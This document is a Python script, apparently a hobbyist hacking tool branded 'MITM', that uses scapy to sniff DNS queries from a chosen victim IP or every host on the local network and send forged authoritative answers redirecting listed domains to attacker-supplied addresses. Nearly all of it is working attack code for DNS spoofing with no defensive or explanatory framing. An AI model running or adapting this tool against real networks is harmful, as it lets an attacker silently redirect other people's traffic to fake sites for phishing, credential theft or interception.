#!/usr/bin/python3
# -*- coding: utf-8 -*-
#Comitted by:Mbale Prince

import os
import sys
import re 
import socket
import art
from colorama import init,Fore


def menu():
    init()
    print(Fore.GREEN + art.text2art("MITM"))
    print(Fore.RED + "By: " + Fore.GREEN + "eVil bRatt aka Mbale Prince\n")
    
menu()

#Checks if an IP passed as arg is a valid IP address
def valid_ip(address):
    try: 
        socket.inet_aton(address)
        return True
    except:
        return False

#Gets the local IP address to avoid self spoofing
def check_local_ip():
    local_ip = "172.16.15.202"
    while True:
        if(valid_ip(local_ip)): break
        else: local_ip = input(Fore.RED + "[WARNING] " + Fore.GREEN + "Enter Your Local IP Address").strip()
    return local_ip

local_ip = check_local_ip()

#Checks args length
if len(sys.argv) != 3:
    print (Fore.RED + "[INFO] " +Fore.GREEN + "Usage: <victim_ip> <records file>")
    sys.exit(1)
else:
    victim_ip = sys.argv[1]
    path = sys.argv[2]

sniff_filter = 'udp dst port 53'
registers = {}

#Validates args format
def valid_args():
    all_pkt = False
    if(not valid_ip(victim_ip)):
        if(victim_ip != 'all'):
            print (Fore.RED + "[FAIL] " + Fore.GREEN + "Invalid victim IP address")
            sys.exit(1)
        else:
            all_pkt = True
    return all_pkt

all_pkt = valid_args();

#Loads the records file and save it into a Dictionary 
def read_file(path):
    if(os.path.isfile(path) and os.stat(path).st_size > 0 ):
        file = open(path,"r")
        for line in file:
            if(line not in ['\n', '\r\n']):
                try:
                    key,value = line.split()
                    registers[key] = value
                    if (not valid_ip(value)):
                        print(Fore.RED + "[WARNING] " + Fore.GREEN + "[!] Detected an invalid IP address in the file")
                        sys.exit(1)
                except:
                    print(Fore.RED + "[FAIL] " + Fore.GREEN + "Invalid file format: <domain> <fake_address>")
                    sys.exit(1)
        file.close()
    else:
        print(Fore.RED + "[FAIL] " + Fore.GREEN + "The DNS record file doesn't exists or is empty")
        sys.exit(1)

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

#Checks if all hosts are spoofed or not
def check_victims(pkt):
    if(all_pkt and IP in pkt): result = True
    elif(IP in pkt): result = (pkt[IP].src == victim_ip)
    else: result = False
    return result  

#Checks if is a valid DNS query and sends a spoofed response
def fake_dns_response(pkt):
    result = check_victims(pkt)
    if (result and pkt[IP].src != local_ip and UDP in pkt and DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and str(pkt[DNSQR].qname)[2:len(str(pkt[DNSQR].qname))-2] in registers):
        cap_domain = str(pkt[DNSQR].qname)[2:len(str(pkt[DNSQR].qname))-2]
        fakeResponse = IP(dst=pkt[IP].src,src=pkt[IP].dst) / UDP(dport=pkt[UDP].sport,sport=53) / DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,aa=1,qr=1, ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname,rdata=registers[cap_domain]) / DNSRR(rrname=pkt[DNSQR].qname,rdata=registers[cap_domain]))
        send(fakeResponse, verbose=0)
        print(Fore.RED + "[INFO] " + Fore.GREEN + "[#] Spoofed response sent to "+"["+pkt[IP].src+"]"+ Fore.GREEN +": Redirecting "+Fore.GREEN +"["+cap_domain+"]"+Fore.GREEN +" to "+Fore.GREEN+"["+registers[cap_domain]+"]")

def main():
    read_file(path)
    print(Fore.RED + "[INFO] " + Fore.GREEN + "Spoofing DNS responses...")
    sniff(prn=fake_dns_response, filter=sniff_filter, store=0)

if __name__ == "__main__":
    main()
